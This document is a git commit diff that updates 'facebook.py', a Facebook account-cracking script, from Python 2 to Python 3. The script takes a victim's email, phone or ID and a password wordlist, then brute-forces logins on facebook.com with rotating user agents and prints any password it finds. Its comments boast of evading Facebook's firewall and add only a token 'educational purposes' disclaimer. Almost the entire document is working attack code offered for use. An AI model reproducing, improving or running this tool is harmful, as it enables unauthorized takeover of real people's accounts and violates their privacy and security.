95dd25d40b524168de3bcae1ac983ad0d560e1f4
Kamil01 <107310243+Adminek01@users.noreply.github.com>
2024-01-31 17:44:01 +0100

    Update facebook.py

--- facebook.py
+++ facebook.py
@@ -1,24 +1,24 @@
-#!usr/bin/python
-#Facebook Cracker Version 2 can crack into Facebook Database 100% without Interruption By Facebook Firewall !
-#This program is for educational purposes only.
-#Don't attack people facebook accounts it's illegal !
-#If you want to crack into someone's account, you must have the permission of the user.
-#Mauritania Attacker is not responsible.or even me!!
+#!/usr/bin/python3
+# Facebook Cracker Version 2 can crack into Facebook Database 100% without Interruption By Facebook Firewall!
+# This program is for educational purposes only.
+# Don't attack people's Facebook accounts; it's illegal!
+# If you want to crack into someone's account, you must have the permission of the user.
+# Mauritania Attacker is not responsible or even me!!
 import sys
 import random
 import mechanize
-import cookielib
+import http.cookiejar  # Updated import for Python 3
 
 GHT = '''
         +=========================================+
         |..........Facebook Cracker v 2...........|
         +-----------------------------------------+
-        |#Author: InfoSecHacker          |
+        |#Author: InfoSecHacker                    |
         |#Contact: www.twitter.com/abhishekmani002|
         |#Date: 23/10/2015                        |
         |#This tool is made for pentesting.       |
         |#Changing the Description of this tool   |
-        |Won't made you the coder ^_^ !!!         |
+        |Won't make you the coder ^_^ !!!         |
         |#Respect Coderz ^_^                      |
         |#I take no responsibilities for the      |
         |  use of this program !                  |
@@ -26,81 +26,89 @@ GHT = '''
         |..........Facebook Cracker v 2...........|
         +-----------------------------------------+
 '''
-print "Note: - This tool can crack facebook account even if you don't have the email of your victim"
-print "# Hit CTRL+C to quit the program"
-print "# Use www.graph.facebook.com for more infos about your victim ^_^"
+print("Note: - This tool can crack Facebook accounts even if you don't have the email of your victim")
+print("# Hit CTRL+C to quit the program")
+print("# Use www.graph.facebook.com for more infos about your victim ^_^")
 
-email = str(raw_input("[+] Enter Email, Phone Number or ID: "))
-passwordlist = str(raw_input("[+] Enter the name of the password list file : "))
+email = input("[+] Enter Email, Phone Number or ID: ")  # Updated input() for Python 3
+passwordlist = input("[+] Enter the name of the password list file : ")  # Updated input() for Python 3
 useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
 login = 'https://www.facebook.com/login.php?login_attempt=1&lwv=100'
+
+
 def attack(password):
-  try:
-     sys.stdout.write("\r[*] trying %s.. " % password)
-     sys.stdout.flush()
-     br.addheaders = [('User-agent', random.choice(useragents))]
-     site = br.open(login)
-     br.select_form(nr=0)
-     
-     ##Facebook
-     br.form['email'] =email
-     br.form['pass'] = password
-     br.submit()
-     log = br.geturl()
-     if log != login:
-        print "\n==========================="
-        print "[*] Password found .. !!"
-        print "[*] Password : %s" % (password)
-        print "==========================="
+    try:
+        sys.stdout.write("\r[*] trying %s.. " % password)
+        sys.stdout.flush()
+        br.addheaders = [('User-agent', random.choice(useragents))]
+        site = br.open(login)
+        br.select_form(nr=0)
+
+        # Facebook
+        br.form['email'] = email
+        br.form['pass'] = password
+        br.submit()
+        log = br.geturl()
+        if log != login:
+            print("\n===========================")
+            print("[*] Password found .. !!")
+            print("[*] Password : %s" % (password))
+            print("===========================")
+            sys.exit(1)
+    except KeyboardInterrupt:
+        print("\n[*] Exiting program .. ")
         sys.exit(1)
-  except KeyboardInterrupt:
-        print "\n[*] Exiting program .. "
-        sys.exit(1)
+
+
 def search():
     global password
     for password in passwords:
-        attack(password.replace("\n",""))
+        attack(password.replace("\n", ""))
+
+
 def check():
     global br
     global passwords
     try:
-       br = mechanize.Browser()
-       cj = cookielib.LWPCookieJar()
-       br.set_handle_robots(False)
-       br.set_handle_equiv(True)
-       br.set_handle_referer(True)
-       br.set_handle_redirect(True)
-       br.set_cookiejar(cj)
-       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+        br = mechanize.Browser()
+        cj = http.cookiejar.LWPCookieJar()  # Updated reference for Python 3
+        br.set_handle_robots(False)
+        br.set_handle_equiv(True)
+        br.set_handle_referer(True)
+        br.set_handle_redirect(True)
+        br.set_cookiejar(cj)
+        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
     except KeyboardInterrupt:
-       print "\n[*] Exiting program ..\n"
-       sys.exit(1)
+        print("\n[*] Exiting program ..\n")
+        sys.exit(1)
     try:
-       list = open(passwordlist, "r")
-       passwords = list.readlines()
-       k = 0
-       while k < len(passwords):
-          passwords[k] = passwords[k].strip()
-          k += 1
+        with open(passwordlist, "r") as file:  # Updated file handling for Python 3
+            passwords = file.readlines()
+            k = 0
+            while k < len(passwords):
+                passwords[k] = passwords[k].strip()
+                k += 1
     except IOError:
-        print "\n [*] Error: check your password list path \n"
+        print("\n [*] Error: check your password list path \n")
         sys.exit(1)
     except KeyboardInterrupt:
-        print "\n [*] Exiting program ..\n"
+        print("\n [*] Exiting program ..\n")
         sys.exit(1)
     try:
-        print GHT
-        print "[*] Account to crack : %s" % (email)
-        print "[*] Loaded :" , len(passwords), "passwords"
-        print "[*] Cracking, please wait ..."
+        print(GHT)
+        print("[*] Account to crack : %s" % (email))
+        print("[*] Loaded :", len(passwords), "passwords")
+        print("[*] Cracking, please wait ...")
     except KeyboardInterrupt:
-        print "\n [*] Exiting program ..\n"
+        print("\n [*] Exiting program ..\n")
         sys.exit(1)
     try:
         search()
         attack(password)
     except KeyboardInterrupt:
-        print "\n [*] Exiting program ..\n"
+        print("\n [*] Exiting program ..\n")
         sys.exit(1)
+
+
 if __name__ == '__main__':
     check()
